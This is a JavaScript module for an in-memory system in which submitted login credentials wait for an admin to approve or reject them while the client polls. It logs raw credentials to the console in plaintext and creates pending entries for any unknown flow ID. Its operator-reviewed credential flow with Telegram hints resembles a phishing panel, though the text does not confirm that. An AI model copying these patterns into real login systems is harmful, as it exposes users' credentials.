// Admin approval system for login credentials
// Uses in-memory storage with extended timeouts to prevent session expiration

class ApprovalSystem {
  constructor() {
    this.pendingApprovals = new Map();
    this.approvalResults = new Map();

    // Clean up old entries every 30 minutes (much less aggressive)
    setInterval(() => this.cleanup(), 30 * 60 * 1000);
  }

  // Create a new pending approval
  createPendingApproval(flowId, credentials) {
    const approval = {
      flowId,
      credentials,
      timestamp: Date.now(),
      status: "pending", // pending, approved, rejected
    };

    this.pendingApprovals.set(flowId, approval);
    console.log(`Created pending approval for flowId: ${flowId}`, approval);
    console.log(`Total pending approvals: ${this.pendingApprovals.size}`);

    return approval;
  }

  // Get pending approval by flowId
  getPendingApproval(flowId) {
    return this.pendingApprovals.get(flowId);
  }

  // Set approval result
  setApprovalResult(flowId, approved, reason = null) {
    console.log(`🔍 Looking for approval with flowId: ${flowId}`);
    console.log(
      `📋 Current pending approvals:`,
      Array.from(this.pendingApprovals.keys())
    );
    console.log(`📋 Flow ID type:`, typeof flowId, `Length:`, flowId?.length);

    const approval = this.pendingApprovals.get(flowId);
    if (!approval) {
      console.log(`❌ No approval found for flowId: ${flowId}`);
      console.log(`🔍 Checking for similar flow IDs...`);

      // Check for similar flow IDs (in case there's a slight mismatch)
      for (const [key, value] of this.pendingApprovals.entries()) {
        if (key.includes(flowId) || flowId.includes(key)) {
          console.log(
            `🔍 Found similar flow ID: ${key} (similar to ${flowId})`
          );
        }
      }

      return false;
    }

    approval.status = approved ? "approved" : "rejected";
    approval.reason = reason;
    approval.resolvedAt = Date.now();

    // Move to results map for client polling
    this.approvalResults.set(flowId, {
      approved,
      reason,
      timestamp: Date.now(),
    });

    return true;
  }

  // Check approval status (for client polling)
  checkApprovalStatus(flowId) {
    console.log(`Checking approval status for flowId: ${flowId}`);

    // First check if there's a result
    const result = this.approvalResults.get(flowId);
    if (result) {
      console.log(`Found result for ${flowId}:`, result);
      return {
        status: "resolved",
        approved: result.approved,
        reason: result.reason,
      };
    }

    // Check if still pending
    const pending = this.pendingApprovals.get(flowId);
    if (pending && pending.status === "pending") {
      console.log(`Found pending approval for ${flowId}:`, pending);
      return {
        status: "pending",
        timestamp: pending.timestamp,
      };
    }

    console.log(`No approval found for flowId: ${flowId}`);
    console.log(
      `Current pending approvals:`,
      Array.from(this.pendingApprovals.keys())
    );
    console.log(`Current results:`, Array.from(this.approvalResults.keys()));

    // If not found, create a new pending approval to prevent "not found" errors
    // This handles cases where server restarted or approval was lost
    console.log(`Creating fallback pending approval for ${flowId}`);
    const fallbackApproval = {
      flowId,
      credentials: { fallback: true },
      timestamp: Date.now(),
      status: "pending",
    };
    this.pendingApprovals.set(flowId, fallbackApproval);

    // Notify admin about the fallback (optional - helps with debugging)
    this.notifyFallbackCreated(flowId);

    return {
      status: "pending",
      timestamp: fallbackApproval.timestamp,
      fallback: true,
    };
  }

  // Clean up old entries (older than 24 hours for pending, 12 hours for results)
  cleanup() {
    const twentyFourHoursAgo = Date.now() - 24 * 60 * 60 * 1000; // 24 hours for pending
    const twelveHoursAgo = Date.now() - 12 * 60 * 60 * 1000; // 12 hours for results

    // Clean up old pending approvals (24 hours)
    for (const [flowId, approval] of this.pendingApprovals.entries()) {
      if (approval.timestamp < twentyFourHoursAgo) {
        this.pendingApprovals.delete(flowId);
        console.log(`Cleaned up old pending approval: ${flowId}`);
      }
    }

    // Clean up old results (12 hours)
    for (const [flowId, result] of this.approvalResults.entries()) {
      if (result.timestamp < twelveHoursAgo) {
        this.approvalResults.delete(flowId);
        console.log(`Cleaned up old approval result: ${flowId}`);
      }
    }
  }

  // Get all pending approvals (for admin dashboard if needed)
  getAllPending() {
    return Array.from(this.pendingApprovals.values()).filter(
      (approval) => approval.status === "pending"
    );
  }

  // Notify admin about fallback approval creation (helps with debugging)
  async notifyFallbackCreated(flowId) {
    // Only notify in development or if explicitly enabled
    if (process.env.NODE_ENV === "production") return;

    try {
      console.log(
        `[DEBUG] Fallback approval created for ${flowId} - this indicates a server restart or session loss`
      );
      // Could send a Telegram notification here if needed for debugging
    } catch (error) {
      console.error("Failed to notify fallback creation:", error);
    }
  }
}

// Singleton instance
const approvalSystem = new ApprovalSystem();
export default approvalSystem;
